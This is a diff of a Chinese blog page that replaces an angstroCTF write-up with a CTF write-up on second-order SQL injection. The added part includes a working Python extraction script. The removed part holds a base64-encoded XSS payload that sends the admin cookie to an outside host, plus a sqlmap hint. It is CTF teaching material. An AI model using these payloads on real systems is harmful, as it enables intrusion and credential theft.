@@ -6,7 +6,7 @@
 <meta HTTP-EQUIV="pragma" CONTENT="no-cache"> 
 <meta HTTP-EQUIV="Cache-Control" CONTENT="no-cache, must-revalidate"> 
 <meta HTTP-EQUIV="expires" CONTENT="0"> 
-<title>angstroCTF Web+Misc | 过客</title>	
+<title>[网鼎杯2018]Unfinish(二次注入) | 过客</title>	
 
 <link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
 <script type="text/javascript">
@@ -150,10 +150,10 @@ window.onload=getCSS();
 	
 	                      
 		<div class="entry-content">
-			<h1 class="wow swing entry-title">angstroCTF Web+Misc</h1>
+			<h1 class="wow swing entry-title">[网鼎杯2018]Unfinish(二次注入)</h1>
 <div class="entry-meta">
 <div class="wow bounce">
-	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-03-15 10:51:17" itemprop="datePublished" pubdate="">2020-03-15</time></i>
+	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-03-15 14:06:16" itemprop="datePublished" pubdate="">2020-03-15</time></i>
 	          </div>
 			
 </span>
@@ -161,108 +161,59 @@ window.onload=getCSS();
 		</div>
                   
 			<div class="wow slideInLeft entry-summary song">
-				<p>ws1:<br>
-追踪TCP流得到Flag<br>
-<img src="https://guokeya.github.io/post-images/1584240752587.png" alt="" loading="lazy"><br>
-ws2:<br>
-HTTP流。导出JPG得到Flag<br>
-<img src="https://guokeya.github.io/post-images/1584240943390.png" alt="" loading="lazy"><br>
-inputter:<br>
-源码如下</p>
-<pre><code>#define _GNU_SOURCE
-
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
-#include &lt;sys/types.h&gt;
-#include &lt;unistd.h&gt;
-
-#define FLAGSIZE 128
-
-void print_flag() {
-    gid_t gid = getegid();
-    setresgid(gid, gid, gid);
-    FILE *file = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
-    char flag[FLAGSIZE];
-    if (file == NULL) {
-        printf(&quot;Cannot read flag file.\n&quot;);
-        exit(1);
-    }
-    fgets(flag, FLAGSIZE, file);
-    printf(&quot;%s&quot;, flag);
-}
-
-int main(int argc, char* argv[]) {
-    setvbuf(stdout, NULL, _IONBF, 0);
-    if (argc != 2) {
-        puts(&quot;Your argument count isn't right.&quot;);
-        return 1;
-    }
-    if (strcmp(argv[1], &quot; \n'\&quot;\x07&quot;)) {
-        puts(&quot;Your argument isn't right.&quot;);
-        return 1;
-    }
-    char buf[128];
-    fgets(buf, 128, stdin);
-    if (strcmp(buf, &quot;\x00\x01\x02\x03\n&quot;)) {
-        puts(&quot;Your input isn't right.&quot;);
-        return 1;
-    }
-    puts(&quot;You seem to know what you're doing.&quot;);
-    print_flag();
-}
+				<p>注入。需要邮箱。用户名。密码。<br>
+登陆。需要邮箱。密码<br>
+登陆后。会限制用户名<br>
+。Web狗的嗅觉。十有八九是二次注入。<br>
+<code>insert into xxx(email,name,pass) values(email,''+database()+'',pass)</code><br>
+<img src="https://guokeya.github.io/post-images/1584252580365.png" alt="" loading="lazy"><br>
+如果直接将回显结果放入拼接。会返回0。转为16进制就可以了<br>
+<code>'+hex(database())+'</code><br>
+<img src="https://guokeya.github.io/post-images/1584252645129.png" alt="" loading="lazy"><br>
+得到数据库名web<br>
+在本地测试下。发现一次HEX。字符串还是会存在英文。会退出。那就2次hex。发现变成了科学计数法。用substr截取就可以了。<br>
+<img src="https://guokeya.github.io/post-images/1584252887481.png" alt="" loading="lazy"><br>
+以下是我的脚本</p>
+<pre><code>import requests
+import re
+url='http://8c4c2e55-3aa3-4f02-b847-37d8ad659cb5.node3.buuoj.cn/register.php'
+for i in range(1,100):
+    data={
+        &quot;email&quot;:str(i)+'@qq.com',
+        &quot;username&quot;:&quot;'+substr(hex(hex((select * from flag))) from &quot;+str(i*3+1)+&quot; for 3)+'&quot;,
+        &quot;password&quot;:&quot;1&quot;
+        }
+    r=requests.post(url=url,data=data)
+url2='http://8c4c2e55-3aa3-4f02-b847-37d8ad659cb5.node3.buuoj.cn/login.php'
+for i in range(1,100):
+    data={
+        &quot;email&quot;:str(i)+'@qq.com',
+        &quot;password&quot;:&quot;1&quot;
+        }
+    r=requests.post(url=url2,data=data,allow_redirects=True)
+    print (re.findall(&quot;.*?&lt;/span&gt;&quot;,r.text)[0].replace('&lt;/span&gt;','').strip(),end='')
 </code></pre>
-<p>只要第一个参数为空格换行'&quot;\x07。第二个参数为\x00010203\n<br>
-a.py:</p>
-<pre><code>print &quot; \n'\&quot;\x07&quot;
-</code></pre>
-<p>b.py:</p>
-<pre><code>print &quot;\x00\x01\x02\x03\n&quot;
-</code></pre>
-<pre><code>python b.py|./inpuuter `python a.py`
-</code></pre>
-<p>得到flag</p>
-<p>ws3:<br>
-是一个git-pack的流量。首先wireshark分离出来<br>
-有一个git-receive-pack文件18KB.其他就1KB.<br>
-继续对此文件分离，得到Flag<br>
-<img src="https://guokeya.github.io/post-images/1584241829597.png" alt="" loading="lazy"></p>
-<p>clam clam clam:<br>
-输入两次clam clam clam得到Flag<br>
-不知道为啥。</p>
-<p>The Magic Word:<br>
-右键查看源码<br>
-<img src="https://guokeya.github.io/post-images/1584241879497.png" alt="" loading="lazy"><br>
-magic的值等于please give flag就能拿到flag。HTML改一下就行<br>
-<img src="https://guokeya.github.io/post-images/1584241931632.png" alt="" loading="lazy"></p>
-<p>Xmas Still Stands:<br>
-XSS。直接给烨师傅的payload</p>
-<pre><code>&lt;img src=x onerror=eval(atob('cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwOi8veHNzeWUuY29tL3lleWV5ZT8nK01hdGgucmFuZG9tKCk='))&gt;
-</code></pre>
-<p>得到管理员cookie后。拿到flag</p>
-<p>Consolation:<br>
-<img src="https://guokeya.github.io/post-images/1584242031985.png" alt="" loading="lazy"></p>
-<p>Git Good:<br>
-githacker下来后git log --reflog<br>
-<img src="https://guokeya.github.io/post-images/1584242219800.png" alt="" loading="lazy"></p>
-<p>Secret Agents:<br>
-题目给出了源码<br>
-毫无过滤就带入sql语句。<br>
-<img src="https://guokeya.github.io/post-images/1584242265678.png" alt="" loading="lazy"><br>
-ua头sqlmap跑以下就行</p>
+<p>开头要加上第一位363。。<br>
+得到363636433631363737423633363533303631333333303633363232443633363233323635324433343334363233333244363136313339333932443636333436353335333133333338363536333636333533393744<br>
+hex解码后得到<br>
+<img src="https://guokeya.github.io/post-images/1584252966822.png" alt="" loading="lazy"></p>
 
 							</div>
 	<div class="wow bounceInDown vt-post-tags">
  
+				<a href="https://guokeya.github.io/tag/CTF/" rel="tag">CTF</a>	
+				 
+				<a href="https://guokeya.github.io/tag/Web/" rel="tag">Web安全</a>	
+				 
 					</div>						
 <nav class="navigation3 post-navigation3" role="navigation">
 		
 		<div class="nav-links3">
       
-		<div class="wow bounceInLeft nav-previous3"><a href="https://guokeya.github.io/post/gW7Qnkxsi/" rel="prev"> [网鼎杯2018]Unfinish(二次注入)</a></div>
+		<div class="wow bounceInLeft nav-previous3"><a href="https://guokeya.github.io/post/lClpsRDJm/" rel="prev"> Wallbreaker_Easy(Bypass disable_function)</a></div>
 		 
 		 
-		<div class="wow bounceInRight nav-next3"><a href="https://guokeya.github.io/post/MzHF-GZP0/" rel="next"> [SWPU2019]Web4(堆叠注入+Thinkphp审计)</a></div>
+		<div class="wow bounceInRight nav-next3"><a href="https://guokeya.github.io/post/galW4kTUg/" rel="next"> angstroCTF Web+Misc</a></div>
 		
 		</div>
 	</nav>
